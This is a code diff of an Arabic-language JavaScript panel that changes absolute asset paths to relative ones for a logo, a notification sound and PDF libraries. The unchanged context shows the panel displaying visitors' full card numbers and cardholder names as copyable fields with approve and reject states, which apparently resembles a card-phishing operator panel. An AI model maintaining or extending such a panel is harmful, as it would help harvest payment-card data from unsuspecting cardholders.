@@ -74,7 +74,7 @@
     return text;
   }
   function bankLogoDataUrl(bankCode) {
-    if (!bankCode) return '/assets/images/unknown-bank.svg';
+    if (!bankCode) return 'assets/images/unknown-bank.svg';
     const palette = {
       kfh: ['#075985','#ffffff'], nbk: ['#1d4ed8','#ffffff'], boubyan: ['#0f766e','#ffffff'],
       gulf: ['#0369a1','#ffffff'], cbk: ['#047857','#ffffff'], abk: ['#7c3aed','#ffffff'],
@@ -332,7 +332,7 @@
     } catch (e) { /* المتصفح لا يدعم Web Audio */ }
     if (!notificationAudio) {
       try {
-        notificationAudio = new Audio('/assets/audio/notification.wav');
+        notificationAudio = new Audio('assets/audio/notification.wav');
         notificationAudio.preload = 'auto';
       } catch (e) { notificationAudio = null; }
     }
@@ -998,7 +998,7 @@
       const scheme = cardSchemeClass(card.scheme || card.network);
       const bankClass = fixedBankCode ? `bank-${cardSchemeClass(fixedBankCode)}` : 'bank-unknown';
       return `<div class="ref-card-shell"><div class="ref-card-box-label"><div><strong>البطاقة ${i + 1}</strong><time class="ref-box-time" data-box-counter data-box-time="${timestamp}" datetime="${timestamp}">${escapeHtml(formatRefTime(timestamp))}</time></div><span class="ref-card-state ${decision}">${cardStatusLabel(card)}</span></div><article class="ref-card-box bank-card bank-card-${scheme} ${bankClass} ${decision === 'approved' ? 'is-approved' : decision === 'rejected' ? 'is-rejected' : ''}" data-ref-time="${timestamp}" data-card-number="${escapeHtml(cardNumber)}">
-        <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='/assets/images/unknown-bank.svg'"></div>
+        <div class="bank-card-top"><div class="bank-card-chip"></div><div class="bank-card-brand" data-card-brand>${escapeHtml(initialBankName)}</div><img class="bank-card-logo" data-bank-logo src="${bankLogoDataUrl(fixedBankCode)}" alt="${fixedBankCode ? `شعار ${escapeHtml(fixedBankCode)}` : 'لم يتم التعرف على البنك'}" onerror="this.onerror=null;this.src='assets/images/unknown-bank.svg'"></div>
         <div class="bank-card-number ref-copyable" data-copy="${escapeHtml(cardNumber || '')}">${escapeHtml(cardNumber || '•••• •••• •••• ••••')}</div>
         <div class="bank-card-details">
           <div><small>حامل البطاقة</small><strong class="ref-copyable" ${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || '')) ? `data-copy="${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || ''))}"` : ''}>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
@@ -1938,7 +1938,7 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
     if (window.__html2pdfLoading) return window.__html2pdfLoading;
     window.__html2pdfLoading = new Promise((resolve, reject) => {
       const script = document.createElement('script');
-      script.src = '/assets/vendor/html2pdf.bundle.min.js';
+      script.src = 'assets/vendor/html2pdf.bundle.min.js';
       script.onload = () => (window.html2pdf ? resolve(window.html2pdf) : reject(new Error('html2pdf غير متاح')));
       script.onerror = () => reject(new Error('تعذر تحميل مكتبة PDF'));
       document.head.appendChild(script);
@@ -1952,7 +1952,7 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
     if (window.__pdfLibLoading) return window.__pdfLibLoading;
     window.__pdfLibLoading = new Promise((resolve, reject) => {
       const script = document.createElement('script');
-      script.src = '/assets/vendor/pdf-lib.min.js';
+      script.src = 'assets/vendor/pdf-lib.min.js';
       script.onload = () => (window.PDFLib ? resolve(window.PDFLib) : reject(new Error('pdf-lib غير متاح')));
       script.onerror = () => reject(new Error('تعذر تحميل مكتبة دمج PDF'));
       document.head.appendChild(script);
